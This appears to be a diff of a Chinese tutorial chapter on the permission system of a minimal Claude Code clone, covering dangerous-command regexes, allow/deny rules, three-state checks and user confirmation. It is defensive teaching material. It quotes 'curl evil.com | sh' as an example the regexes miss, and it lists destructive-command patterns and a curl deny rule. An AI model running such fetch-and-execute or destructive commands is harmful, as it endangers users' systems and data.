@@ -40,7 +40,7 @@ Claude Code 在真实环境执行代码——读写文件、运行 Shell、操�
 | 2 | 权限模式 | 全局策略开关（default/plan/acceptEdits/bypassPermissions/dontAsk） |
 | 3 | 权限规则匹配 | allow/deny/ask 规则，8 个来源，优先级从企业策略到会话级 |
 | 4 | Bash AST 分析 | tree-sitter 解析命令为 AST，23 项静态安全检查，FAIL-CLOSED 原则 |
-| 5 | 工具级验证 | validateInput + checkPermissions，保护危险文件路径和路径边界 |
+| 5 | 工具级验证 | 输入校验 + 权限检查，保护危险文件路径和路径边界 |
 | 6 | 沙箱隔离 | macOS Seatbelt / Linux namespace，限制文件系统和网络访问范围 |
 | 7 | 用户确认 | 交互对话框 + Hook + ML 分类器竞速，第一个决定生效 |
 
@@ -66,35 +66,7 @@ Claude Code 在真实环境执行代码——读写文件、运行 Shell、操�
 
 用 16 个正则覆盖最常见的破坏性操作（10 个 Unix + 6 个 Windows）：
 
-<!-- tabs:start -->
-#### **TypeScript**
-```typescript
-// tools.ts
-const DANGEROUS_PATTERNS = [
-  /\brm\s/,
-  /\bgit\s+(push|reset|clean|checkout\s+\.)/,
-  /\bsudo\b/,
-  /\bmkfs\b/,
-  /\bdd\s/,
-  />\s*\/dev\//,
-  /\bkill\b/,
-  /\bpkill\b/,
-  /\breboot\b/,
-  /\bshutdown\b/,
-  // Windows
-  /\bdel\s/i,
-  /\brmdir\s/i,
-  /\bformat\s/i,
-  /\btaskkill\s/i,
-  /\bRemove-Item\s/i,
-  /\bStop-Process\s/i,
-];
-
-export function isDangerous(command: string): boolean {
-  return DANGEROUS_PATTERNS.some((p) => p.test(command));
-}
-```
-#### **Python**
+#### Python
 ```python
 # tools.py
 DANGEROUS_PATTERNS = [
@@ -119,11 +91,12 @@ DANGEROUS_PATTERNS = [
 def is_dangerous(command: str) -> bool:
     return any(p.search(command) for p in DANGEROUS_PATTERNS)
 ```
-<!-- tabs:end -->
 
 Windows 模式加 `i` 标志是因为 Windows 命令本身不区分大小写。
 
 局限性很明显：`find / -delete`、`curl evil.com | sh` 这类危险命令不会被捕获。这就是 Claude Code 选择 AST 分析的原因——但对最小实现来说，16 个正则覆盖了大多数常见情况。
+
+正则检测属于低成本的第一道防线。它实现简单、速度快、容易读懂，但无法完整理解 shell 语义。例如命令替换、管道、变量展开、别名都会让真实行为变复杂。所以文档后面还会强调配置规则和用户确认：正则只负责拦截常见危险模式，不应该被当成完整沙箱。
 
 ### 2. 权限规则系统
 
@@ -133,25 +106,7 @@ Windows 模式加 `i` 标志是因为 Windows 命令本身不区分大小写。
 
 把字符串规则拆成结构化数据。`run_shell(npm test*)` → `{tool: "run_shell", pattern: "npm test*"}`，裸工具名 → `{tool: "read_file", pattern: null}`。
 
-<!-- tabs:start -->
-#### **TypeScript**
-```typescript
-// tools.ts
-
-interface ParsedRule {
-  tool: string;
-  pattern: string | null;  // null 表示匹配该工具的所有调用
-}
-
-function parseRule(rule: string): ParsedRule {
-  const match = rule.match(/^([a-z_]+)\((.+)\)$/);
-  if (match) {
-    return { tool: match[1], pattern: match[2] };
-  }
-  return { tool: rule, pattern: null };
-}
-```
-#### **Python**
+#### Python
 ```python
 # tools.py
 
@@ -161,43 +116,14 @@ def _parse_rule(rule: str) -> dict:
         return {"tool": m.group(1), "pattern": m.group(2)}
     return {"tool": rule, "pattern": None}
 ```
-<!-- tabs:end -->
 
 #### 加载规则（loadPermissionRules）
 
 两个文件的规则**追加**到同一个数组（不是覆盖），所以用户级和项目级规则并存。结果缓存在内存里——一个会话有几十上百次工具调用，每次都读磁盘没必要。
 
-<!-- tabs:start -->
-#### **TypeScript**
-```typescript
-// tools.ts
+用户级规则适合保存个人偏好，比如总是允许 `run_shell(pytest*)`。项目级规则适合保存团队约定，比如禁止 `run_shell(git push --force*)`。两者追加到同一个规则列表后，项目可以提供默认安全边界，用户也可以在自己的机器上增加常用 allow 规则。
 
-let cachedRules: PermissionRules | null = null;
-
-export function loadPermissionRules(): PermissionRules {
-  if (cachedRules) return cachedRules;
-
-  const allow: ParsedRule[] = [];
-  const deny: ParsedRule[] = [];
-
-  const userSettings = loadSettings(join(homedir(), ".claude", "settings.json"));
-  const projectSettings = loadSettings(join(process.cwd(), ".claude", "settings.json"));
-
-  for (const settings of [userSettings, projectSettings]) {
-    if (!settings?.permissions) continue;
-    if (Array.isArray(settings.permissions.allow)) {
-      for (const r of settings.permissions.allow) allow.push(parseRule(r));
-    }
-    if (Array.isArray(settings.permissions.deny)) {
-      for (const r of settings.permissions.deny) deny.push(parseRule(r));
-    }
-  }
-
-  cachedRules = { allow, deny };
-  return cachedRules;
-}
-```
-#### **Python**
+#### Python
 ```python
 # tools.py
 
@@ -226,38 +152,12 @@ def load_permission_rules() -> dict:
     _cached_rules = {"allow": allow, "deny": deny}
     return _cached_rules
 ```
-<!-- tabs:end -->
 
 #### 规则匹配（matchesRule）
 
 三层判断：工具名不匹配直接跳过 → 无 pattern 则工具名匹配即可 → 有 pattern 则取 `command` 或 `file_path` 做匹配。支持两种匹配方式：尾部 `*` 做前缀匹配，否则精确匹配。
 
-<!-- tabs:start -->
-#### **TypeScript**
-```typescript
-// tools.ts
-
-function matchesRule(
-  rule: ParsedRule,
-  toolName: string,
-  input: Record<string, any>
-): boolean {
-  if (rule.tool !== toolName) return false;
-  if (!rule.pattern) return true;
-
-  let value = "";
-  if (toolName === "run_shell") value = input.command || "";
-  else if (input.file_path) value = input.file_path;
-  else return true;
-
-  const pattern = rule.pattern;
-  if (pattern.endsWith("*")) {
-    return value.startsWith(pattern.slice(0, -1));
-  }
-  return value === pattern;
-}
-```
-#### **Python**
+#### Python
 ```python
 # tools.py
 
@@ -280,35 +180,14 @@ def _matches_rule(rule: dict, tool_name: str, inp: dict) -> bool:
         return value.startswith(pattern[:-1])
     return value == pattern
 ```
-<!-- tabs:end -->
 
 注意：`run_shell(np*)` 会同时匹配 `npm` 和 `npx`，写规则时注意前缀精确度。
 
-#### 规则检查（checkPermissionRules）
+#### 规则检查（`_check_permission_rules`）
 
 返回值是三态：`"allow"` / `"deny"` / `null`（无意见，交给下一层）。deny 先于 allow 遍历，所以即使你写了 `allow: ["run_shell"]`，`deny: ["run_shell(rm -rf*)"]` 仍然生效——"先放开，再收紧"的规则写法因此成立。
 
-<!-- tabs:start -->
-#### **TypeScript**
-```typescript
-// tools.ts
-
-function checkPermissionRules(
-  toolName: string,
-  input: Record<string, any>
-): "allow" | "deny" | null {
-  const rules = loadPermissionRules();
-
-  for (const rule of rules.deny) {
-    if (matchesRule(rule, toolName, input)) return "deny";
-  }
-  for (const rule of rules.allow) {
-    if (matchesRule(rule, toolName, input)) return "allow";
-  }
-  return null;
-}
-```
-#### **Python**
+#### Python
 ```python
 # tools.py
 
@@ -323,81 +202,67 @@ def _check_permission_rules(tool_name: str, inp: dict) -> str | None:
             return "allow"
     return None
 ```
-<!-- tabs:end -->
+
+#### 四个规则函数的关系
+
+这四个函数不是重复实现，而是一条从"配置字符串"到"最终规则裁决"的流水线：
+
+```text
+配置文件里的字符串规则
+        ↓
+_parse_rule()              解析成结构化规则
+        ↓
+load_permission_rules()    加载并缓存所有规则
+        ↓
+_matches_rule()            判断某一条规则是否命中当前工具调用
+        ↓
+_check_permission_rules()  综合 deny/allow，给出最终规则结论
+```
+
+可以用一句话记住：
+
+| 函数 | 负责什么 | 输入 | 输出 |
+|------|----------|------|------|
+| `_parse_rule()` | 拆规则 | 一条字符串规则 | 一条结构化规则 |
+| `load_permission_rules()` | 收集规则 | 用户级 + 项目级配置文件 | `{"allow": [...], "deny": [...]}` |
+| `_matches_rule()` | 比对一条规则 | 一条规则 + 当前工具调用 | `True` / `False` |
+| `_check_permission_rules()` | 做规则层裁决 | 当前工具调用 | `"allow"` / `"deny"` / `None` |
+
+例如配置里写：
+
+```json
+{
+  "permissions": {
+    "allow": ["run_shell(npm test*)"],
+    "deny": ["run_shell(npm test --delete*)"]
+  }
+}
+```
+
+当前工具调用是：
+
+```python
+tool_name = "run_shell"
+inp = {"command": "npm test --delete-cache"}
+```
+
+执行过程是：
+
+1. `_parse_rule()` 把 `"run_shell(npm test*)"` 和 `"run_shell(npm test --delete*)"` 拆成 dict。
+2. `load_permission_rules()` 把 allow 和 deny 两组规则加载到内存里。
+3. `_check_permission_rules()` 先检查 deny。
+4. `_matches_rule()` 发现 `"npm test --delete*"` 匹配 `"npm test --delete-cache"`。
+5. 最终返回 `"deny"`。
+
+所以即使命令也匹配 `allow: ["run_shell(npm test*)"]`，仍然会被拒绝。原因是 `_check_permission_rules()` 永远先遍历 deny，再遍历 allow。
 
 ### 3. 统一权限检查
 
-`checkPermission` 是权限系统的统一入口，整合了权限模式、配置文件规则和内置危险检测，返回 `{action, message}`，action 三种值：`allow`、`deny`、`confirm`。
+`check_permission()` 是权限系统的统一入口，整合了权限模式、配置文件规则和内置危险检测，返回包含动作和提示消息的结果，动作有三种值：`allow`、`deny`、`confirm`。
 
 优先级：**deny 规则 > allow 规则 > 模式逻辑 > 内置危险检测 > 默认允许**。
 
-<!-- tabs:start -->
-#### **TypeScript**
-```typescript
-// tools.ts — checkPermission
-
-export function checkPermission(
-  toolName: string,
-  input: Record<string, any>,
-  mode: PermissionMode = "default",
-  planFilePath?: string
-): { action: "allow" | "deny" | "confirm"; message?: string } {
-  if (mode === "bypassPermissions") return { action: "allow" };
-
-  // Layer 1: 配置文件规则（deny 优先）
-  const ruleResult = checkPermissionRules(toolName, input);
-  if (ruleResult === "deny") {
-    return { action: "deny", message: `Denied by permission rule for ${toolName}` };
-  }
-  if (ruleResult === "allow") {
-    return { action: "allow" };
-  }
-
-  // 读工具永远安全
-  if (READ_TOOLS.has(toolName)) return { action: "allow" };
-
-  // 权限模式检查
-  if (mode === "plan") {
-    if (EDIT_TOOLS.has(toolName)) {
-      const filePath = input.file_path || input.path;
-      if (planFilePath && filePath === planFilePath) return { action: "allow" };
-      return { action: "deny", message: `Blocked in plan mode: ${toolName}` };
-    }
-    if (toolName === "run_shell") {
-      return { action: "deny", message: "Shell commands blocked in plan mode" };
-    }
-  }
-
-  if (mode === "acceptEdits" && EDIT_TOOLS.has(toolName)) {
-    return { action: "allow" };
-  }
-
-  // Layer 2: 内置危险模式检查
-  let needsConfirm = false;
-  let confirmMessage = "";
-
-  if (toolName === "run_shell" && isDangerous(input.command)) {
-    needsConfirm = true;
-    confirmMessage = input.command;
-  } else if (toolName === "write_file" && !existsSync(input.file_path)) {
-    needsConfirm = true;
-    confirmMessage = `write new file: ${input.file_path}`;
-  } else if (toolName === "edit_file" && !existsSync(input.file_path)) {
-    needsConfirm = true;
-    confirmMessage = `edit non-existent file: ${input.file_path}`;
-  }
-
-  if (needsConfirm) {
-    if (mode === "dontAsk") {
-      return { action: "deny", message: `Auto-denied (dontAsk mode): ${confirmMessage}` };
-    }
-    return { action: "confirm", message: confirmMessage };
-  }
-
-  return { action: "allow" };
-}
-```
-#### **Python**
+#### Python
 ```python
 # tools.py — check_permission
 
@@ -456,47 +321,67 @@ def check_permission(
 
     return {"action": "allow"}
 ```
-<!-- tabs:end -->
 
 触发确认的条件：`run_shell` + 危险命令，`write_file` / `edit_file` + 目标不存在。`read_file`、`list_files`、`grep_search` 永远安全。Layer 1 无意见才进 Layer 2，两层都没拦住就默认允许。
 
+返回三态而不是布尔值，是这个函数最重要的设计。`allow` 表示可以直接执行；`deny` 表示直接把拒绝结果返回给模型；`confirm` 表示需要用户参与。这样主循环可以根据不同结果采取不同动作，而不是把所有“不允许”都混成一种错误。
+
+#### `check_permission()` 的执行顺序
+
+可以把 `check_permission()` 理解成 agent 调用工具前的总闸门。它不执行工具，只回答一个问题：这次工具调用应该直接执行、直接拒绝，还是先问用户？
+
+它的参数分别代表：
+
+| 参数 | 含义 | 示例 |
+|------|------|------|
+| `tool_name` | 当前要调用的工具名 | `"run_shell"` |
+| `inp` | 工具输入参数 | `{"command": "npm test"}` |
+| `mode` | 当前权限模式 | `"default"` / `"plan"` |
+| `plan_file_path` | plan 模式下唯一允许写入的计划文件 | `"~/.claude/plans/plan-xxx.md"` |
+
+代码按顺序做这些判断：
+
+1. 如果是 `bypassPermissions`，直接返回 `allow`。
+2. 检查配置文件规则。命中 deny 就拒绝，命中 allow 就放行。
+3. 如果是读工具，直接放行。
+4. 如果是 `plan` 模式，禁止编辑普通文件和运行 shell，只允许写计划文件。
+5. 如果是 `acceptEdits` 模式，编辑工具直接放行。
+6. 检查内置危险模式：危险 shell、新建文件、编辑不存在文件都需要确认。
+7. 如果需要确认但处于 `dontAsk` 模式，直接拒绝。
+8. 前面都没有拦截，则默认允许。
+
+几个典型例子：
+
+```python
+check_permission("read_file", {"file_path": "README.md"})
+# {"action": "allow"}
+
+check_permission("run_shell", {"command": "rm -rf node_modules"})
+# {"action": "confirm", "message": "rm -rf node_modules"}
+
+check_permission("write_file", {"file_path": "src/new_feature.py"})
+# 如果文件不存在：
+# {"action": "confirm", "message": "write new file: src/new_feature.py"}
+
+check_permission("run_shell", {"command": "rm -rf node_modules"}, mode="dontAsk")
+# {"action": "deny", "message": "Auto-denied (dontAsk mode): rm -rf node_modules"}
+```
+
+为什么返回三态而不是布尔值？因为 `False` 无法区分"规则禁止"和"需要用户确认"。三态让主循环可以清楚处理：
+
+```text
+allow    直接执行工具
+deny     不执行，把拒绝消息返回给模型
+confirm  弹出确认，用户同意后再执行
+```
+
+需要注意一个实现细节：本章前面说"deny 优先"是权限规则层的原则；但这份简化代码里 `bypassPermissions` 在函数开头直接返回 `allow`，因此它会跳过后续 allow/deny 规则和危险检测。真实 Claude Code 的 `--yolo` 更保守，仍然有 deny 规则和特殊路径保护；mini-claude 这里采用的是"完全信任"语义。
+
 ### 4. 会话级白名单
 
-在 Agent Loop 中，用 `confirmedPaths` Set 记住已授权的操作：
+在智能体循环中，用 `_confirmed_paths` 集合记住已授权的操作：
 
-<!-- tabs:start -->
-#### **TypeScript**
-```typescript
-// agent.ts
-
-private confirmedPaths: Set<string> = new Set();
-
-const perm = checkPermission(toolUse.name, input, this.permissionMode, this.planFilePath);
-
-if (perm.action === "deny") {
-  printInfo(`Denied: ${perm.message}`);
-  toolResults.push({
-    type: "tool_result",
-    tool_use_id: toolUse.id,
-    content: `Action denied: ${perm.message}`,
-  });
-  continue;
-}
-
-if (perm.action === "confirm" && perm.message && !this.confirmedPaths.has(perm.message)) {
-  const confirmed = await this.confirmDangerous(perm.message);
-  if (!confirmed) {
-    toolResults.push({
-      type: "tool_result",
-      tool_use_id: toolUse.id,
-      content: "User denied this action.",
-    });
-    continue;
-  }
-  this.confirmedPaths.add(perm.message);
-}
-```
-#### **Python**
+#### Python
 ```python
 # agent.py
 
@@ -518,28 +403,46 @@ if perm["action"] == "confirm" and perm.get("message") and perm["message"] not i
         continue
     self._confirmed_paths.add(perm["message"])
 ```
-<!-- tabs:end -->
 
 拒绝时把 `"User denied this action."` 作为工具结果返回，而不是抛错或中断循环——LLM 看到后会调整策略，这是关键设计。deny 规则命中时不弹对话框，直接把拒绝消息返回给模型。confirm 走会话白名单，用户确认一次后同一操作不再重复询问。
 
-### 5. 确认对话框
+#### 会话级白名单怎么工作
 
-<!-- tabs:start -->
-#### **TypeScript**
-```typescript
-// agent.ts
-private async confirmDangerous(command: string): Promise<boolean> {
-  printConfirmation(command);
-  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-  return new Promise((resolve) => {
-    rl.question("  Allow? (y/n): ", (answer) => {
-      rl.close();
-      resolve(answer.toLowerCase().startsWith("y"));
-    });
-  });
+`_confirmed_paths` 是一个集合，保存当前会话里用户已经确认过的操作。虽然名字里有 `paths`，但它保存的不一定是文件路径，也可能是危险命令字符串，例如：
+
+```python
+self._confirmed_paths = {
+    "rm -rf node_modules",
+    "write new file: src/new_feature.py",
 }
 ```
-#### **Python**
+
+它只在当前 agent 运行期间有效。程序退出后，集合就消失了；下次启动仍然需要重新确认。
+
+主循环拿到 `check_permission()` 的结果后分两类处理：
+
+1. `deny`：直接拒绝，不问用户。
+2. `confirm`：如果这个操作没在 `_confirmed_paths` 里，就问用户；用户同意后加入白名单。
+
+完整流程可以这样看：
+
+```text
+check_permission() 返回 confirm
+        ↓
+message 是否已经在 _confirmed_paths 里？
+        ↓
+是：直接执行
+否：调用 _confirm_dangerous() 问用户
+        ↓
+用户同意：加入 _confirmed_paths，然后执行
+用户拒绝：把 "User denied this action." 返回给模型
+```
+
+这里有一个很重要的设计：拒绝不是抛异常，也不是中断整个 agent，而是作为工具结果返回给模型。模型看到 `"User denied this action."` 后，可以尝试换一种做法，或者向用户解释这个操作无法继续。
+
+### 5. 确认对话框
+
+#### Python
 ```python
 # agent.py
 async def _confirm_dangerous(self, command: str) -> bool:
@@ -552,7 +455,41 @@ async def _confirm_dangerous(self, command: str) -> bool:
     except EOFError:
         return False
 ```
-<!-- tabs:end -->
+
+#### `_confirm_dangerous()` 做了什么
+
+`_confirm_dangerous()` 负责真正向用户确认危险操作。它接收一个字符串，例如：
+
+```text
+rm -rf node_modules
+write new file: src/new_feature.py
+```
+
+返回值是布尔值：
+
+```text
+True   用户同意
+False  用户拒绝
+```
+
+函数内部有三层处理：
+
+1. `print_confirmation(command)`：先把危险操作展示给用户。
+2. 如果传入了 `confirm_fn`，就交给外部确认函数处理。
+3. 如果没有 `confirm_fn`，就退回到命令行 `input("  Allow? (y/n): ")`。
+
+`confirm_fn` 的好处是让确认逻辑可以适配不同环境：命令行里可以用 `input()`，测试里可以传一个总是返回 `True` 或 `False` 的 fake 函数，Web UI 里则可以接一个弹窗。
+
+默认命令行确认里，只要输入以 `y` 开头就算同意：
+
+```text
+y
+Y
+yes
+YES
+```
+
+其他输入都算拒绝。遇到 `EOFError` 也返回 `False`，这通常发生在 CI、管道运行、后台任务等没有交互输入的环境中。无法确认时默认拒绝，是安全系统里的 fail-closed 原则。
 
 ### 5 种权限模式
 
@@ -599,7 +536,7 @@ mini-claude --dont-ask "..."       # dontAsk（CI 环境）
 // .claude/settings.json（项目级，提交到仓库）
 {
   "permissions": {
-    "allow": ["run_shell(npm run build)"],
+    "allow": ["run_shell(python -m compileall mini_claude)"],
     "deny": ["run_shell(curl*)"]
   }
 }
@@ -641,3 +578,11 @@ mini-claude --dont-ask "..."       # dontAsk（CI 环境）
 ---
 
 > **下一章**：Agent 对话越来越长，上下文窗口快满了——4 层压缩流水线让它看起来拥有无限记忆。
+
+## 本章小结：权限系统不是为了阻止 Agent，而是为了限定边界
+
+权限系统的目标不是让智能体什么都做不了，而是让它在明确边界内自动行动。读文件、搜索代码通常可以直接放行；写文件、运行 shell、修改 Git 状态就要根据模式和规则判断。这样既能保持效率，又不会把危险操作完全交给模型自由发挥。
+
+代码实现集中在 `tools.py` 的 `check_permission()`。它会先看权限模式，比如 `bypassPermissions`、`plan`、`acceptEdits`、`dontAsk`；再加载 `~/.claude/settings.json` 和项目 `.claude/settings.json` 里的 allow/deny 规则；如果是 shell 命令，还会用正则检测危险模式。返回值不是简单布尔值，而是 `allow`、`deny` 或 `confirm`，这样主循环知道是直接执行、直接拒绝，还是弹出确认。
+
+相关概念是“纵深防御”。真实 Claude Code 有更多层：信任目录、AST 命令分析、沙箱、Hook、企业策略等。当前 Python 版保留了最核心的几层，足够展示原则：权限应该由代码强制执行，而不只是写在系统提示词里让模型自觉遵守。
